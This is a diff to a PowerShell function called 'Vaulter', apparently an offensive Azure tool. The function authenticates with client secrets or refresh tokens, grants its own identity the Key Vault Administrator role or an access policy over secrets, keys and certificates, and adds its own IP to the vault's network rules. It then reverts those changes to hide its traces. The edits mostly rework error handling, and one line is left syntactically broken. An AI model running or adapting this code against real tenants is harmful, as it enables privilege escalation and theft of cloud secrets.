@@ -914,19 +914,19 @@ function Vaulter{
 
                                                         write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
                                                         try{
-                                                            New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | Out-Null
+                                                            $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                                             $y = $True
                                                         }
                                                         catch{
-                                                            write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
-                                                            break
+                                                            write-host "[-] Could not added Role Definision Name to your Identity"
+                                                            $y= $False
                                                         }
                                                             if($y){
-                                                                write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
-                                                                $y= $False
+                                                            Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
+                                                            $y= $False
                                                             }
                                                         try{
-                                                            Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                                            $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                             $y = $True
                                                         }
                                                         catch{
@@ -1066,12 +1066,12 @@ function Vaulter{
 
                                                         write-host "[!]Restoring changes..."
                                                         try{
-                                                            remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                         }
                                                         catch{
                                                         }
                                                         try{
-                                                            remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null                
+                                                            $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop                
                                                         }
                                                         catch{
                                                         }
@@ -1089,19 +1089,31 @@ function Vaulter{
                                         $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
                                         try{
-                                            New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null
-                                        }
+                                            $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
+                                            $y = $True
+                                            }
                                         catch{
+                                            write-host "[-] Could not added Role Definision Name to your Identity"
+                                            $y= $False
                                         }
-
+                                            if($y){
+                                                Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
+                                                $y= $False
+                                            }
                                         try{
-                                            New-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | out-null
+                                            $null = New-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
+                                            $y = $True
                                         }
                                         catch{
-                                        }                                        
-                                        if ($ClientID -and $ClientSecret -and $TenantID){
-                                            $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         }
+                                            if($y){
+                                                Write-Host "[+]Your IP Address $($myIP) was successfully added to Network Rule"
+                                                $y= $False
+                                            }
+
+                                        if ($ClientID -and $ClientSecret -and $TenantID){
+                                                $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
+                                            }
                                         elseif ($RefreshToken -and $TenantID) {
                                             $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                         }
@@ -1224,13 +1236,13 @@ function Vaulter{
                                             }
 
                                             try{
-                                                remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null 
+                                                $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop 
                                             }
                                             catch{
 
                                             }
                                             try{
-                                                remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                                $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                             }
                                             catch{
 
@@ -1252,20 +1264,19 @@ function Vaulter{
 
                                     write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen                                    
                                     try{
-                                        New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null
+                                        $null = New-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                         $y = $True
                                     }
                                     catch{
-                                        write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
-                                        continue
+                                        write-host "[-] Could not added Role Definision Name to your Identity"
+                                        $y= $False
                                     }
                                         if($y){
-                                             write-host "[+]'Key Vault Administrator' role has been successfully added to your identity."
-                                             $y = $False
+                                            Write-Host "[+]'Key Vault Administrator' role was added successfully to your Identity"
+                                            $y= $False
                                         }
-                                    
                                     try{
-                                        Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                        $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                         $y = $True
                                     }
                                     catch{
@@ -1402,11 +1413,11 @@ function Vaulter{
 
                                     write-host "[!]Restoring changes..."
                                     try{
-                                        remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                       $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                     }
                                     catch{  }
                                     try{
-                                        remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID | out-null
+                                        $null = remove-AzRoleAssignment -RoleDefinitionName "Key Vault Administrator" -ObjectId $MyOid -Scope $VaultID -ErrorAction Stop
                                         continue
                                     }
                                     catch{
@@ -1462,13 +1473,13 @@ function Vaulter{
                                         $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                         Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null
                                         try{
-                                            Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List | Out-Null
+                                            $null = Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                         }
                                         catch{
 
                                         }
                                         try{
-                                            Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                            $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                         }
                                         catch{
 
@@ -1580,13 +1591,13 @@ function Vaulter{
                                                 $uri = $page.nextLink
                                         }
                                         try{
-                                            remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                         }
                                         catch{
 
                                         }
                                         try{
-                                            remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid | Out-Null
+                                            $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                         }
                                         catch{
 
@@ -1606,18 +1617,17 @@ function Vaulter{
                                             write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
 
                                             try{
-                                                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List | Out-Null
-                                                $y = $True
+                                               $null = Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                             }
                                             catch{
-                                                write-host "[-] Could Not added 'Key Vault Administrator' Role to your Identity.."
+                                                write-host "[-] Could No make change on Access Policy Rule"
                                             }
                                                 if($y){
-                                                    write-host "[+]Added full permissions to your Itentity"
+                                                    write-host "[+]Added full permissions on Key Vault to your Itentity"
                                                     $y = $False
                                                 }
                                             try{
-                                                Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                                $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                 $y = $True
                                             }
                                             catch{
@@ -1754,11 +1764,11 @@ function Vaulter{
 
                                             write-host "[!]Restoring changes..."
                                             try{
-                                                remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                               $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP |-ErrorAction Stop
                                             }
                                             catch{  }
                                             try{
-                                                remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid | Out-Null
+                                               $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                                 continue
                                             }
                                             catch{
@@ -1787,19 +1797,18 @@ function Vaulter{
                                         write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
                                     
                                         try{
-                                            Set-AzKeyVaultAccessPolicy -VaultName $($vaultName) -ResourceGroupName $($ResourceGroup) -ObjectId $($MyOid) -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List | Out-Null
+                                            $null = Set-AzKeyVaultAccessPolicy -VaultName $($vaultName) -ResourceGroupName $($ResourceGroup) -ObjectId $($MyOid) -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                             $y = $True
                                         }
                                         catch{
-                                            write-host "[-] Could Not chnaged permission,sorry"
+                                            write-host "[-] Could No make change on Access Policy Rule"
                                         }
                                             if($y){
-                                                write-host "[+]Added full permissions to your Itentity"
+                                                write-host "[+]Added full permissions on Key Vault to your Itentity"
                                                 $y = $False
                                             }
-                                        
                                         try{
-                                            Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                           $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                             $y = $True
                                         }
                                         catch{
@@ -1935,11 +1944,11 @@ function Vaulter{
 
                                         write-host "[!]Restoring changes..."
                                         try{
-                                            remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP | Out-Null
+                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                         }
                                         catch{  }
                                         try{
-                                            remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid | Out-Null
+                                            $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                             continue
                                         }
                                         catch{
@@ -2210,4 +2219,3 @@ function main{
 
 main
 }
-
